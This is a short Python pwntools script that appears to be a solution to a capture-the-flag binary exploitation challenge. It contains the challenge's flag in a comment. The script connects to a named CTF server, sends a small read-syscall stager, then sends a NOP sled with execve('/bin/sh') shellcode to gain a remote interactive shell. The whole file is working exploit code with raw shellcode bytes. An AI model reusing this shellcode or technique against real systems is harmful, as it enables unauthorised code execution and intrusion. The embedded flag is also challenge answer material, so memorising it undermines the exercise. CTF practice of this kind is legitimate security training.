#!/usr/bin/env python
from pwn import *

# AD{NX_pr0t4ct10n_d1sab1e_1s_h4cker_fr1endly}

host , port = 'ctf.yuawn.idv.tw' , 10104
y = remote( host , port )

sc = '1\xff\xbe`\x10`\x00\xba\x00\x01\x00\x001\xc0\x0f\x05'

y.send( sc )

y.send( '\x90' * 0x20 + 'H1\xf6H1\xd2H\xb8/bin/sh\x00PH\x89\xe7j;X\x0f\x05' )
#y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()